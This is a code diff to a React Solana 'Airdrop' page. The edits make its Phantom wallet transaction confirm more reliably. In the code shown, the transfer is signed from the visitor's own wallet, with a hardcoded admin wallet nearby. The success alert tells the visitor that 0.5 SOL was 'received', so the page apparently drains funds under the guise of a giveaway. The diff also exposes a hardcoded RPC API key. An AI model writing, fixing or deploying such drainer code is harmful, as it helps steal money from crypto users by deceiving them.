@@ -22,7 +22,7 @@ const Airdrop = () => {
 
   const launchDate = new Date('2025-04-27T00:00:00Z');
   const adminWallet = new PublicKey('4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD');
-  const connection = new Connection('https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/');
+  const connection = new Connection('https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/', 'confirmed');
 
   const blacklist = [
     '2vY6rLpZ7U6u1iX3Kb9TBLk8FWpjmR3SzDeYN2vgqvnU',
@@ -104,10 +104,10 @@ const Airdrop = () => {
       if (!provider || !provider.isPhantom) throw new Error('Phantom wallet not found');
 
       const fromPubkey = publicKey;
-      const { blockhash } = await connection.getLatestBlockhash();
+      const latestBlockhash = await connection.getLatestBlockhash();
 
       const transaction = new Transaction({
-        recentBlockhash: blockhash,
+        recentBlockhash: latestBlockhash.blockhash,
         feePayer: fromPubkey
       }).add(
         SystemProgram.transfer({
@@ -121,7 +121,7 @@ const Airdrop = () => {
         commitment: 'confirmed',
       });
 
-      await connection.confirmTransaction(signature, 'confirmed');
+      await connection.confirmTransaction({ signature, ...latestBlockhash }, 'confirmed');
       console.log('✅ Transaction success:', signature);
       alert('0.5 SOL successfully received!');
       setShowPopup(false);
@@ -179,7 +179,6 @@ const Airdrop = () => {
         {error && <p className="text-red-400 mt-4">{error}</p>}
       </div>
 
-      {/* Confirm Popup */}
       {showPopup && (
         <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-60 flex items-center justify-center z-50">
           <div className="bg-white p-6 rounded shadow-lg text-black">
